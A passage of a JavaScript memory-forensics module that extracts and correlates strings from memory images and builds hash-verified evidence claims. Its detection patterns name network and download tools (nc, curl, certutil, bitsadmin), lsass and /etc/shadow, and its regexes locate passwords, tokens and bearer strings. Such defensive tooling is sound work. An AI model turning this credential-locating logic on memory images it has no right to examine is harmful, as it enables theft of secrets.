import { readFileSync } from "node:fs";
import { join } from "node:path";

let root;
let redact;
let shortHash;
let bufferSha256;
let writePrivate;
let noWrite;
let shellQuote;
let firmwareStrings;

export function configureMemoryRuntime(runtime) {
	({ root, redact, shortHash, bufferSha256, writePrivate, noWrite, shellQuote, firmwareStrings } = runtime);
}
function memorySignals(strings) {
	const osHints = [];
	const processes = [];
	const cmdlines = [];
	const network = [];
	const credentials = [];
	const files = [];
	const timestamps = [];
	const addUnique = (list, value, offset) => {
		const raw = String(value ?? "");
		const text = redact(raw.slice(0, 300));
		if (!text || list.some((row) => row.text === text)) return;
		list.push({
			offset,
			sourceOffset: offset,
			text,
			valueSha256: bufferSha256(Buffer.from(raw)),
			valueLength: Buffer.byteLength(raw),
		});
	};
	for (const row of strings) {
		const text = row.text;
		for (const match of text.matchAll(/\b(?:Windows\s+(?:NT|10|11|Server)[^\0\r\n]{0,80}|Linux version [^\0\r\n]{0,160}|Ubuntu [^\0\r\n]{0,80}|Debian GNU\/Linux[^\0\r\n]{0,80}|Darwin Kernel Version[^\0\r\n]{0,120})/gi)) addUnique(osHints, match[0], row.offset + match.index);
		for (const match of text.matchAll(/\b(?:System|Registry|smss|csrss|wininit|services|lsass|svchost|explorer|powershell|cmd|rundll32|regsvr32|wmic|chrome|firefox|ssh|sshd|bash|sh|python|perl|ruby|java|node|nginx|apache2?|mysql|postgres)\.exe\b|\b(?:sshd|bash|zsh|python3?|node|nginx|apache2?|mysqld|postgres)\b/gi)) addUnique(processes, match[0], row.offset + match.index);
		for (const match of text.matchAll(/\b(?:powershell(?:\.exe)?|cmd(?:\.exe)?|bash|sh|python3?|curl|wget|nc|ncat|certutil|bitsadmin|rundll32|regsvr32|wmic|schtasks|scp|ssh)\b[^\0\r\n]{0,220}/gi)) addUnique(cmdlines, match[0], row.offset + match.index);
		for (const match of text.matchAll(/https?:\/\/[^\s"'<>\\]{4,}|\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b/gi)) addUnique(network, match[0], row.offset + match.index);
		for (const match of text.matchAll(/\b(?:password|passwd|pwd|token|secret|api[_-]?key|authorization|cookie|session|client_secret|access_token|refresh_token|ntlm|hash)\b[\w ._-]{0,32}[:=]\s*["']?[^"'\s<>]{4,}|\bBearer\s+[A-Za-z0-9._~+/=-]{8,}/gi)) addUnique(credentials, match[0], row.offset + match.index);
		for (const match of text.matchAll(/[A-Za-z]:\\(?:Users|Windows|ProgramData|Temp|AppData)\\[^\0\r\n"'<>]{2,180}|\/(?:etc|home|root|var|tmp|opt|usr)\/[A-Za-z0-9._/@+-][^\0\r\n"'<>]{1,180}/g)) addUnique(files, match[0], row.offset + match.index);
		for (const match of text.matchAll(/\b(?:20\d{2}[-/]\d{2}[-/]\d{2}[ T]\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:?\d{2})?|\d{2}\/\d{2}\/20\d{2}\s+\d{2}:\d{2}:\d{2})\b/g)) addUnique(timestamps, match[0], row.offset + match.index);
		if (osHints.length + processes.length + cmdlines.length + network.length + credentials.length + files.length + timestamps.length >= 320) break;
	}
	return {
		osHints: osHints.slice(0, 40),
		processes: processes.slice(0, 80),
		cmdlines: cmdlines.slice(0, 80),
		network: network.slice(0, 80),
		credentials: credentials.slice(0, 60),
		files: files.slice(0, 80),
		timestamps: timestamps.slice(0, 60),
	};
}

function nearestMemorySignal(list, offset, window = 2048) {
	let best;
	for (const row of list ?? []) {
		const distance = Math.abs((row.offset ?? 0) - offset);
		if (distance <= window && (!best || distance < best.distance)) best = { ...row, distance };
	}
	return best;
}

function memoryProcessName(text) {
	return text.match(/\b(?:[A-Za-z0-9_.-]+\.exe|sshd|bash|zsh|python3?|node|nginx|apache2?|mysqld|postgres)\b/i)?.[0] ?? null;
}

function memoryCorrelations(signals) {
	const processNetwork = [];
	const credentialContext = [];
	const timeline = [];
	for (const cmdline of signals.cmdlines ?? []) {
		const linkedNetwork = (signals.network ?? []).find((row) => cmdline.text.includes(row.text) || Math.abs((row.offset ?? 0) - (cmdline.offset ?? 0)) <= 512);
		if (!linkedNetwork) continue;
		processNetwork.push({
			process: memoryProcessName(cmdline.text),
			cmdline,
			network: linkedNetwork,
		});
		if (processNetwork.length >= 40) break;
	}
	for (const credential of signals.credentials ?? []) {
		const cmdline = nearestMemorySignal(signals.cmdlines, credential.offset, 2048);
		const process = nearestMemorySignal(signals.processes, credential.offset, 2048);
		const network = nearestMemorySignal(signals.network, credential.offset, 2048);
		const file = nearestMemorySignal(signals.files, credential.offset, 2048);
		credentialContext.push({
			credential,
			process: process ? { offset: process.offset, text: process.text, distance: process.distance } : null,
			cmdline: cmdline ? { offset: cmdline.offset, text: cmdline.text, distance: cmdline.distance } : null,
			network: network ? { offset: network.offset, text: network.text, distance: network.distance } : null,
			file: file ? { offset: file.offset, text: file.text, distance: file.distance } : null,
		});
		if (credentialContext.length >= 40) break;
	}
	for (const timestamp of signals.timestamps ?? []) {
		const cmdline = nearestMemorySignal(signals.cmdlines, timestamp.offset, 4096);
		const network = nearestMemorySignal(signals.network, timestamp.offset, 4096);
		const process = nearestMemorySignal(signals.processes, timestamp.offset, 4096);
		timeline.push({
			timestamp,
			process: process ? { offset: process.offset, text: process.text, distance: process.distance } : null,
			cmdline: cmdline ? { offset: cmdline.offset, text: cmdline.text, distance: cmdline.distance } : null,
			network: network ? { offset: network.offset, text: network.text, distance: network.distance } : null,
		});
		if (timeline.length >= 40) break;
	}
	return {
		processNetwork,
		credentialContext,
		timeline,
	};
}

function memoryQuicklookSummary(target) {
	const data = readFileSync(target);
	const strings = firmwareStrings(data, 5, 5000);
	const signals = memorySignals(strings);
	const correlations = memoryCorrelations(signals);
	const osGuess = signals.osHints.some((row) => /Windows/i.test(row.text))
		? "windows"
		: signals.osHints.some((row) => /Linux|Ubuntu|Debian/i.test(row.text))
			? "linux"
			: signals.osHints.some((row) => /Darwin/i.test(row.text))
				? "darwin"
				: "unknown";
	const risks = [];
	if (signals.credentials.length) risks.push("credential-string-signal");
	if (signals.network.length) risks.push("network-artifact-signal");
	if (signals.cmdlines.some((row) => /powershell|certutil|bitsadmin|rundll32|regsvr32|nc|ncat|curl|wget/i.test(row.text))) risks.push("suspicious-commandline-signal");
	if (signals.processes.some((row) => /lsass\.exe|sshd|mysql|postgres/i.test(row.text))) risks.push("high-value-process-signal");
	if (signals.files.some((row) => /\\Users\\|\/home\/|\/root\/|\/etc\/passwd|\/etc\/shadow|\.ssh/i.test(row.text))) risks.push("user-or-credential-file-signal");
	if (correlations.processNetwork.length) risks.push("process-network-correlation-signal");
	if (correlations.credentialContext.length) risks.push("credential-context-correlation-signal");
	if (correlations.timeline.length) risks.push("timeline-correlation-signal");
	return {
		kind: "repi-memory-quicklook",
		schemaVersion: 2,
		size: data.length,
		sha256: bufferSha256(data),
		osGuess,
		entropy: firmwareEntropySamples(data),
		stringScan: {
			count: strings.length,
			scannedBytes: Math.min(data.length, 32 * 1024 * 1024),
			signals,
		},
		correlations,
		risks,
	};
}

function memorySignalRows(summary) {
	const rows = [];
	const signals = summary.stringScan?.signals ?? {};
	for (const [kind, values] of Object.entries(signals)) {
		if (!Array.isArray(values)) continue;
		for (const row of values.slice(0, 120)) {
			rows.push({
				kind,
				sourceOffset: row.sourceOffset ?? row.offset ?? null,
				text: row.text ?? "",
				valueSha256: row.valueSha256 ?? null,
				valueLength: row.valueLength ?? null,
			});
		}
	}
	return rows;
}

function memoryVerifySignalRows(target, summary) {
	const data = readFileSync(target);
	const rows = [];
	for (const row of memorySignalRows(summary)) {
		const sourceOffset = Number(row.sourceOffset);
		const valueLength = Number(row.valueLength);
		const valueSha256 = row.valueSha256 ?? null;
		let verified = false;
		let reason = "missing-offset-hash-binding";
		let actual = {};
		let negativeControl = null;
		if (Number.isFinite(sourceOffset) && Number.isFinite(valueLength) && valueLength > 0 && valueSha256) {
			if (sourceOffset < 0 || sourceOffset + valueLength > data.length) {
				reason = "signal-offset-out-of-range";
			} else {
				const chunk = data.subarray(sourceOffset, sourceOffset + valueLength);
				actual = { sha256: bufferSha256(chunk), length: chunk.length };
				verified = actual.sha256 === valueSha256 && actual.length === valueLength;
				reason = verified ? "memory-signal-offset-hash-match" : "memory-signal-offset-hash-mismatch";
				if (chunk.length) {
					const mutated = Buffer.from(chunk);
					mutated[0] ^= 0xff;
					const mutatedSha256 = bufferSha256(mutated);
					negativeControl = {
						controlType: "memory-signal-byte-mutation-rejection",
						mutatedSha256,
						passed: mutatedSha256 !== valueSha256,
					};
				}
			}
		}
		rows.push({
			kind: row.kind,
			sourceOffset: Number.isFinite(sourceOffset) ? sourceOffset : null,
			redactedText: row.text,
			valueSha256,
			valueLength: Number.isFinite(valueLength) ? valueLength : null,
			actual,
			verified,
			reason,
			negativeControl,
		});
	}
	return rows;
}

function memoryVerifiedOffset(signalChecks, kind, offset) {
	return signalChecks.find((row) => row.kind === kind && row.sourceOffset === offset && row.verified) ?? null;
}

function memoryCorrelationVerificationRows(summary, signalChecks) {
	const correlations = summary.correlations ?? {};
	const rows = [];
	for (const row of (correlations.processNetwork ?? []).slice(0, 40)) {
		const cmdlineOffset = row.cmdline?.sourceOffset ?? row.cmdline?.offset ?? null;
		const networkOffset = row.network?.sourceOffset ?? row.network?.offset ?? null;
		const distance = Number.isFinite(Number(cmdlineOffset)) && Number.isFinite(Number(networkOffset)) ? Math.abs(Number(cmdlineOffset) - Number(networkOffset)) : null;
		const cmdlineVerified = memoryVerifiedOffset(signalChecks, "cmdlines", cmdlineOffset);
		const networkVerified = memoryVerifiedOffset(signalChecks, "network", networkOffset);
		rows.push({
			correlationType: "process-network",
			cmdlineOffset,
			networkOffset,
			distance,
			verified: Boolean(cmdlineVerified && networkVerified && distance != null && distance <= 512),
			reason: cmdlineVerified && networkVerified ? (distance != null && distance <= 512 ? "process-network-distance-verified" : "process-network-distance-too-large") : "missing-source-offset-verification",
		});
	}
	for (const row of (correlations.credentialContext ?? []).slice(0, 40)) {
		const credentialOffset = row.credential?.sourceOffset ?? row.credential?.offset ?? null;
		const cmdlineOffset = row.cmdline?.sourceOffset ?? row.cmdline?.offset ?? null;
		const networkOffset = row.network?.sourceOffset ?? row.network?.offset ?? null;
		const fileOffset = row.file?.sourceOffset ?? row.file?.offset ?? null;
		const credentialVerified = memoryVerifiedOffset(signalChecks, "credentials", credentialOffset);
		const cmdlineVerified = cmdlineOffset == null ? null : memoryVerifiedOffset(signalChecks, "cmdlines", cmdlineOffset);
		const networkVerified = networkOffset == null ? null : memoryVerifiedOffset(signalChecks, "network", networkOffset);
		const fileVerified = fileOffset == null ? null : memoryVerifiedOffset(signalChecks, "files", fileOffset);
		const contextVerified = Boolean(cmdlineVerified || networkVerified || fileVerified);
		rows.push({
			correlationType: "credential-context",
			credentialOffset,
			cmdlineOffset,
			networkOffset,
			fileOffset,
			verified: Boolean(credentialVerified && contextVerified),
			reason: credentialVerified && contextVerified ? "credential-context-source-offsets-verified" : "missing-credential-context-source-offset-verification",
		});
	}
	for (const row of (correlations.timeline ?? []).slice(0, 40)) {
		const timestampOffset = row.timestamp?.sourceOffset ?? row.timestamp?.offset ?? null;
		const cmdlineOffset = row.cmdline?.sourceOffset ?? row.cmdline?.offset ?? null;
		const networkOffset = row.network?.sourceOffset ?? row.network?.offset ?? null;
		const timestampVerified = memoryVerifiedOffset(signalChecks, "timestamps", timestampOffset);
		const cmdlineVerified = cmdlineOffset == null ? null : memoryVerifiedOffset(signalChecks, "cmdlines", cmdlineOffset);
		const networkVerified = networkOffset == null ? null : memoryVerifiedOffset(signalChecks, "network", networkOffset);
		rows.push({
			correlationType: "timeline",
			timestampOffset,
			cmdlineOffset,
			networkOffset,
			verified: Boolean(timestampVerified && (cmdlineVerified || networkVerified)),
			reason: timestampVerified && (cmdlineVerified || networkVerified) ? "timeline-source-offsets-verified" : "missing-timeline-source-offset-verification",
		});
	}
	return rows;
}

function memoryEvidenceVerificationClaims(summary, verificationRows) {
	const claimLedger = [];
	const composedPaths = [];
	const addClaim = (claim) => claimLedger.push({ verdict: "promoted", confidence: 0.76, blockers: [], ...claim });
	const verifiedSignals = verificationRows.signalChecks.filter((row) => row.verified);
	const verifiedProcessNetwork = verificationRows.correlationChecks.filter((row) => row.verified && row.correlationType === "process-network");
	const verifiedCredentialContext = verificationRows.correlationChecks.filter((row) => row.verified && row.correlationType === "credential-context");
	const verifiedTimeline = verificationRows.correlationChecks.filter((row) => row.verified && row.correlationType === "timeline");
	const passedControls = verificationRows.negativeControls.filter((row) => row.passed);
	if (verificationRows.imageIdentity.verified) {
		addClaim({
			id: "memory-image-hash-verification-" + shortHash(verificationRows.imageIdentity.sha256),
			claimType: "memory-image-hash-verification-proof",
			sourceBinding: { artifact: "memory-evidence-verification.json" },
			evidenceBinding: { size: verificationRows.imageIdentity.size, sha256: verificationRows.imageIdentity.sha256, osGuess: summary.osGuess },
			statement: "Verifier re-read the memory image and matched size/SHA-256 against quicklook identity.",
			confidence: 0.9,
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	if (verifiedSignals.length) {
		addClaim({
			id: "memory-signal-offset-verification-" + shortHash(verifiedSignals.map((row) => `${row.kind}:${row.sourceOffset}:${row.valueSha256}`).join("|")),
			claimType: "memory-signal-offset-verification-proof",
			sourceBinding: { artifact: "memory-evidence-verification.json", offsets: verifiedSignals.slice(0, 48).map((row) => ({ kind: row.kind, sourceOffset: row.sourceOffset })) },
			evidenceBinding: { verifiedCount: verifiedSignals.length, kinds: Array.from(new Set(verifiedSignals.map((row) => row.kind))).sort() },
			statement: "Verifier bound memory signal rows to exact source offsets and raw-value hashes without exposing secret material.",
			confidence: 0.86,
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	if (verifiedProcessNetwork.length) {
		addClaim({
			id: "memory-process-network-verification-" + shortHash(verifiedProcessNetwork.map((row) => `${row.cmdlineOffset}:${row.networkOffset}`).join("|")),
			claimType: "memory-process-network-verification-proof",
			sourceBinding: { artifact: "memory-evidence-verification.json", rows: verifiedProcessNetwork.map((row) => ({ cmdlineOffset: row.cmdlineOffset, networkOffset: row.networkOffset, distance: row.distance })) },
			evidenceBinding: { verifiedCount: verifiedProcessNetwork.length },
			statement: "Verifier confirmed process/network correlations using source-bound command line and endpoint offsets within the correlation window.",
			confidence: 0.86,
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	if (verifiedCredentialContext.length) {
		addClaim({
			id: "memory-credential-context-verification-" + shortHash(verifiedCredentialContext.map((row) => `${row.credentialOffset}:${row.cmdlineOffset}:${row.networkOffset}:${row.fileOffset}`).join("|")),
			claimType: "memory-credential-context-verification-proof",
			sourceBinding: { artifact: "memory-evidence-verification.json", rows: verifiedCredentialContext.map((row) => ({ credentialOffset: row.credentialOffset, cmdlineOffset: row.cmdlineOffset, networkOffset: row.networkOffset, fileOffset: row.fileOffset })) },
			evidenceBinding: { verifiedCount: verifiedCredentialContext.length },
			statement: "Verifier confirmed credential context by requiring source-bound credential bytes plus a nearby process, network, or file anchor.",
			confidence: 0.86,
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	if (verifiedTimeline.length) {
		addClaim({
			id: "memory-timeline-verification-" + shortHash(verifiedTimeline.map((row) => `${row.timestampOffset}:${row.cmdlineOffset}:${row.networkOffset}`).join("|")),
			claimType: "memory-timeline-verification-proof",
			sourceBinding: { artifact: "memory-evidence-verification.json", rows: verifiedTimeline.map((row) => ({ timestampOffset: row.timestampOffset, cmdlineOffset: row.cmdlineOffset, networkOffset: row.networkOffset })) },
			evidenceBinding: { verifiedCount: verifiedTimeline.length },
			statement: "Verifier confirmed timestamped memory pivots are tied to source-bound process or network evidence.",
			confidence: 0.8,
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	if (passedControls.length) {
		addClaim({
			id: "memory-verifier-negative-control-" + shortHash(passedControls.map((row) => `${row.controlType}:${row.mutatedSha256}`).join("|")),
			claimType: "memory-verifier-negative-control-proof",
			sourceBinding: { artifact: "memory-evidence-verification.json" },
			evidenceBinding: { passedControls },
			statement: "Verifier ran mutation controls proving altered source bytes do not keep the original memory evidence hash.",
			confidence: 0.84,
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	const imageClaim = claimLedger.find((claim) => claim.claimType === "memory-image-hash-verification-proof");
	const signalClaim = claimLedger.find((claim) => claim.claimType === "memory-signal-offset-verification-proof");
	const processNetworkClaim = claimLedger.find((claim) => claim.claimType === "memory-process-network-verification-proof");
	const credentialClaim = claimLedger.find((claim) => claim.claimType === "memory-credential-context-verification-proof");
	const timelineClaim = claimLedger.find((claim) => claim.claimType === "memory-timeline-verification-proof");
	const controlClaim = claimLedger.find((claim) => claim.claimType === "memory-verifier-negative-control-proof");
	if (imageClaim && signalClaim && credentialClaim && (processNetworkClaim || timelineClaim) && controlClaim) {
		const segments = [imageClaim, signalClaim, credentialClaim, processNetworkClaim, timelineClaim, controlClaim].filter(Boolean);
		const composed = {
			id: "memory-forensic-proof-path-" + shortHash(segments.map((claim) => claim.id).join(">")),
			claimType: "memory-forensic-proof-path",
			sourceBinding: { segments: segments.map((claim) => ({ id: claim.id, claimType: claim.claimType, artifact: claim.sourceBinding?.artifact })) },
			evidenceBinding: {
				imageSha256: verificationRows.imageIdentity.sha256,
				hasCredentialContext: Boolean(credentialClaim),
				hasProcessNetwork: Boolean(processNetworkClaim),
				hasTimeline: Boolean(timelineClaim),
				hasNegativeControl: Boolean(controlClaim),
			},
			statement: "Memory verification composes image identity, signal offsets, credential/process/network or timeline correlations, and mutation controls into a rerunnable forensic proof path.",
			verdict: "promoted",
			confidence: processNetworkClaim && timelineClaim ? 0.9 : 0.84,
			blockers: [],
			rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		};
		claimLedger.push(composed);
		composedPaths.push(composed);
	}
	return { claimLedger, composedPaths };
}

function memoryEvidenceVerificationSummary(target, summary) {
	const data = readFileSync(target);
	const imageIdentity = {
		size: data.length,
		sha256: bufferSha256(data),
		verified: data.length === summary.size && bufferSha256(data) === summary.sha256,
	};
	if (data.length) {
		const mutated = Buffer.from(data);
		mutated[0] ^= 0xff;
		const mutatedSha256 = bufferSha256(mutated);
		imageIdentity.negativeControl = {
			controlType: "memory-image-byte-mutation-rejection",
			mutatedSha256,
			passed: mutatedSha256 !== summary.sha256,
		};
	}
	const signalChecks = memoryVerifySignalRows(target, summary);
	const correlationChecks = memoryCorrelationVerificationRows(summary, signalChecks);
	const negativeControls = [imageIdentity.negativeControl, ...signalChecks.map((row) => row.negativeControl)].filter((row) => row?.passed);
	const claims = memoryEvidenceVerificationClaims(summary, { imageIdentity, signalChecks, correlationChecks, negativeControls });
	const verifiedSignals = signalChecks.filter((row) => row.verified);
	const verifiedProcessNetwork = correlationChecks.filter((row) => row.verified && row.correlationType === "process-network");
	const verifiedCredentialContext = correlationChecks.filter((row) => row.verified && row.correlationType === "credential-context");
	const verifiedTimeline = correlationChecks.filter((row) => row.verified && row.correlationType === "timeline");
	const blockers = [];
	if (!imageIdentity.verified) blockers.push("missing-memory-image-hash-verification");
	if (!verifiedSignals.length) blockers.push("missing-memory-signal-offset-verification");
	if ((summary.correlations?.processNetwork ?? []).length && !verifiedProcessNetwork.length) blockers.push("missing-memory-process-network-verification");
	if ((summary.correlations?.credentialContext ?? []).length && !verifiedCredentialContext.length) blockers.push("missing-memory-credential-context-verification");
	if ((summary.correlations?.timeline ?? []).length && !verifiedTimeline.length) blockers.push("missing-memory-timeline-verification");
	if (!negativeControls.length) blockers.push("missing-memory-negative-control");
	const repairActions = {
		"missing-memory-image-hash-verification": "Rerun memory-evidence-verifier.py against original bytes and require size/SHA-256 equality.",
		"missing-memory-signal-offset-verification": "Bind memory signal rows to sourceOffset/valueSha256/valueLength and rerun the verifier.",
		"missing-memory-process-network-verification": "Require command line and network endpoint offsets to be source-bound and within the correlation window.",
		"missing-memory-credential-context-verification": "Tie credential bytes to source-bound process, command line, network, or file offsets before promotion.",
		"missing-memory-timeline-verification": "Bind timestamp rows to source-bound process/network evidence before claiming timeline proof.",
		"missing-memory-negative-control": "Add byte mutation controls so altered memory evidence is rejected by hash.",
	};
	const repairQueue = blockers.map((blocker) => ({
		id: "memory-evidence-verification-" + blocker,
		blocker,
		action: repairActions[blocker] ?? "Collect verifier-bound memory evidence and rerun memory-evidence-verifier.py.",
		rerunCommand: "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
	}));
	const promotedClaims = claims.claimLedger.filter((claim) => claim.verdict === "promoted");
	return {
		kind: "repi-memory-evidence-verification",
		schemaVersion: 1,
		generatedAt: new Date().toISOString(),
		target: redact(target),
		proofReady: promotedClaims.length > 0,
		imageIdentity,
		signalChecks,
		correlationChecks,
		negativeControls,
		stats: {
			signalsVerified: verifiedSignals.length,
			processNetworkVerified: verifiedProcessNetwork.length,
			credentialContextVerified: verifiedCredentialContext.length,
			timelineVerified: verifiedTimeline.length,
			negativeControlsPassed: negativeControls.length,
		},
		claimLedger: claims.claimLedger,
		composedPaths: claims.composedPaths,
		promotionReport: { proofReady: promotedClaims.length > 0, promotedClaims, blockers },
		repairQueue,
	};
}


function memoryEvidenceClaims(summary, verification) {
	const signals = summary.stringScan?.signals ?? {};
	const correlations = summary.correlations ?? {};
	const claimLedger = [];
	const addClaim = (claim) => {
		claimLedger.push({
			verdict: "promoted",
			confidence: 0.7,
			blockers: [],
			...claim,
		});
	};
	for (const row of (signals.processes ?? []).slice(0, 32)) {
		const highValue = /lsass\.exe|sshd|mysql|postgres/i.test(row.text);
		if (!highValue) continue;
		addClaim({
			id: "memory-high-value-process-" + shortHash(`${row.offset}:${row.text}`),
			claimType: "memory-high-value-process",
			sourceBinding: {
				artifact: "memory-quicklook.json",
				offset: row.offset,
			},
			evidenceBinding: {
				process: row.text,
				osGuess: summary.osGuess,
			},
			statement: "Memory strings identify a high-value process anchor for credential or session triage.",
			confidence: 0.74,
			rerunCommand: "cat memory-quicklook.json | jq '.stringScan.signals.processes'",
		});
	}
	for (const row of (signals.cmdlines ?? []).slice(0, 32)) {
		const suspicious = /powershell|certutil|bitsadmin|rundll32|regsvr32|nc|ncat|curl|wget/i.test(row.text);
		if (!suspicious) continue;
		addClaim({
			id: "memory-suspicious-cmdline-" + shortHash(`${row.offset}:${row.text}`),
			claimType: "memory-suspicious-commandline",
			sourceBinding: {
				artifact: "memory-quicklook.json",
				offset: row.offset,
			},
			evidenceBinding: {
				cmdline: row.text,
			},
			statement: "Memory strings identify a suspicious command line that should be tied to process and network context.",
			confidence: 0.72,
			rerunCommand: "cat memory-quicklook.json | jq '.stringScan.signals.cmdlines'",
		});
	}
	for (const row of (correlations.processNetwork ?? []).slice(0, 32)) {
		addClaim({
			id: "memory-process-network-" + shortHash(`${row.cmdline?.offset}:${row.network?.offset}:${row.process ?? ""}`),
			claimType: "memory-process-network-correlation",
			sourceBinding: {
				artifact: "memory-quicklook.json",
				cmdlineOffset: row.cmdline?.offset,
				networkOffset: row.network?.offset,
			},
			evidenceBinding: {
				process: row.process ?? null,
				cmdline: row.cmdline?.text ?? null,
				network: row.network?.text ?? null,
			},
			statement: "Memory evidence correlates a process command line with a network endpoint, suitable for timeline replay.",
			confidence: 0.82,
			rerunCommand: "cat memory-quicklook.json | jq '.correlations.processNetwork'",
		});
	}
	for (const row of (correlations.credentialContext ?? []).slice(0, 32)) {
		addClaim({
			id: "memory-credential-context-" + shortHash(`${row.credential?.offset}:${row.cmdline?.offset ?? ""}:${row.network?.offset ?? ""}:${row.file?.offset ?? ""}`),
			claimType: "memory-credential-context",
			sourceBinding: {
				artifact: "memory-quicklook.json",
				credentialOffset: row.credential?.offset,
			},
			evidenceBinding: {
				credential: row.credential?.text ?? null,
				process: row.process?.text ?? null,
				cmdline: row.cmdline?.text ?? null,
				network: row.network?.text ?? null,
				file: row.file?.text ?? null,
				distances: {
					process: row.process?.distance ?? null,
					cmdline: row.cmdline?.distance ?? null,
					network: row.network?.distance ?? null,
					file: row.file?.distance ?? null,
				},
			},
			statement: "Memory evidence ties credential material to nearby process, command line, network, or file context.",
			confidence: row.network || row.cmdline ? 0.84 : 0.74,
			rerunCommand: "cat memory-quicklook.json | jq '.correlations.credentialContext'",
		});
	}
	for (const row of (correlations.timeline ?? []).slice(0, 32)) {
		addClaim({
			id: "memory-timeline-correlation-" + shortHash(`${row.timestamp?.offset}:${row.cmdline?.offset ?? ""}:${row.network?.offset ?? ""}`),
			claimType: "memory-timeline-correlation",
			sourceBinding: {
				artifact: "memory-quicklook.json",
				timestampOffset: row.timestamp?.offset,
			},
			evidenceBinding: {
				timestamp: row.timestamp?.text ?? null,
				process: row.process?.text ?? null,
				cmdline: row.cmdline?.text ?? null,
				network: row.network?.text ?? null,
			},
			statement: "Memory evidence provides a timestamped pivot bound to nearby process, command line, or network material.",
			confidence: row.cmdline || row.network ? 0.78 : 0.64,
			rerunCommand: "cat memory-quicklook.json | jq '.correlations.timeline'",
		});
	}
	for (const claim of verification?.claimLedger ?? []) {
		if (claim.verdict !== "promoted") continue;
		addClaim({
			...claim,
			id: claim.id || "memory-verification-claim-" + shortHash(JSON.stringify(claim)),
			sourceBinding: {
				artifact: "memory-evidence-verification.json",
				...(claim.sourceBinding ?? {}),
			},
			rerunCommand: claim.rerunCommand ?? "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		});
	}
	const promotedClaims = claimLedger.filter((claim) => claim.verdict === "promoted");
	const credentialClaim = promotedClaims.find((claim) => claim.claimType === "memory-credential-context");
	const processNetworkClaim = promotedClaims.find((claim) => claim.claimType === "memory-process-network-correlation");
	const timelineClaim = promotedClaims.find((claim) => claim.claimType === "memory-timeline-correlation");
	const highValueClaim = promotedClaims.find((claim) => claim.claimType === "memory-high-value-process");
	const verifierCredentialClaim = promotedClaims.find((claim) => claim.claimType === "memory-credential-context-verification-proof");
	const verifierProcessNetworkClaim = promotedClaims.find((claim) => claim.claimType === "memory-process-network-verification-proof");
	const verifierTimelineClaim = promotedClaims.find((claim) => claim.claimType === "memory-timeline-verification-proof");
	const verifierNegativeControlClaim = promotedClaims.find((claim) => claim.claimType === "memory-verifier-negative-control-proof");
	const composedPaths = [];
	for (const path of verification?.composedPaths ?? []) {
		const composed = {
			...path,
			id: path.id || "memory-verification-path-" + shortHash(JSON.stringify(path)),
			sourceBinding: {
				artifact: "memory-evidence-verification.json",
				...(path.sourceBinding ?? {}),
			},
			rerunCommand: path.rerunCommand ?? "python3 memory-evidence-verifier.py <memory-image> memory-quicklook.json memory-evidence-verification.json",
		};
		claimLedger.push(composed);
		promotedClaims.push(composed);
		composedPaths.push(composed);
	}
	if (credentialClaim && (processNetworkClaim || highValueClaim)) {
		const segments = [credentialClaim, verifierCredentialClaim, processNetworkClaim, verifierProcessNetworkClaim, timelineClaim, verifierTimelineClaim, highValueClaim, verifierNegativeControlClaim].filter(Boolean);
		const composed = {
			id: "memory-credential-network-pivot-" + shortHash(segments.map((claim) => claim.id).join(">")),
			claimType: "memory-credential-network-pivot",
			sourceBinding: {
				segments: segments.map((claim) => ({
					id: claim.id,
					claimType: claim.claimType,
					offset: claim.sourceBinding?.credentialOffset ?? claim.sourceBinding?.cmdlineOffset ?? claim.sourceBinding?.offset,
				})),
			},
			evidenceBinding: {
				osGuess: summary.osGuess,
				hasCredentialContext: true,
				hasProcessNetwork: Boolean(processNetworkClaim),
				hasTimeline: Boolean(timelineClaim),
				hasHighValueProcess: Boolean(highValueClaim),
				hasVerifierCredentialContext: Boolean(verifierCredentialClaim),
				hasVerifierProcessNetwork: Boolean(verifierProcessNetworkClaim),
				hasVerifierTimeline: Boolean(verifierTimelineClaim),
				hasNegativeControl: Boolean(verifierNegativeControlClaim),
			},
			statement: "Memory correlations compose credential material with process/network context, timestamp evidence, source-offset verification, and mutation controls into a concrete investigation pivot.",
			verdict: "promoted",
			confidence: verifierNegativeControlClaim && verifierCredentialClaim ? 0.9 : processNetworkClaim && timelineClaim ? 0.86 : 0.8,
			blockers: [],
			rerunCommand: "cat memory-evidence-claims.json | jq '.composedPaths'",
		};
		claimLedger.push(composed);
		promotedClaims.push(composed);
		composedPaths.push(composed);
	}
	const blockers = [];
	if (summary.osGuess === "unknown") blockers.push("missing-os-profile");
	if (!processNetworkClaim) blockers.push("missing-process-network-correlation");
	if (!credentialClaim) blockers.push("missing-credential-context");
	if (!timelineClaim) blockers.push("missing-timeline-correlation");
	if (!highValueClaim) blockers.push("missing-high-value-process");
	for (const blocker of verification?.promotionReport?.blockers ?? []) {
		if (!blockers.includes(blocker)) blockers.push(blocker);
	}
	const repairActions = {
		"missing-os-profile": "Run volatility info/banner plugins or collect OS strings until the memory profile is anchored.",
		"missing-process-network-correlation": "Correlate netscan/socket endpoints with command lines or process names before claiming network activity.",
		"missing-credential-context": "Tie credential strings to nearby process, file, registry, command line, or network offsets.",
		"missing-timeline-correlation": "Extract timestamped rows and bind them to process/network context for ordering.",
		"missing-high-value-process": "Collect process listings or strings for credential-bearing/high-value processes such as lsass or sshd.",
		"missing-memory-image-hash-verification": "Rerun memory-evidence-verifier.py against original bytes and require size/SHA-256 equality.",
		"missing-memory-signal-offset-verification": "Bind every promoted memory signal to sourceOffset/valueSha256/valueLength.",
		"missing-memory-process-network-verification": "Require commandline and network endpoint offsets to be source-bound and within the correlation window.",
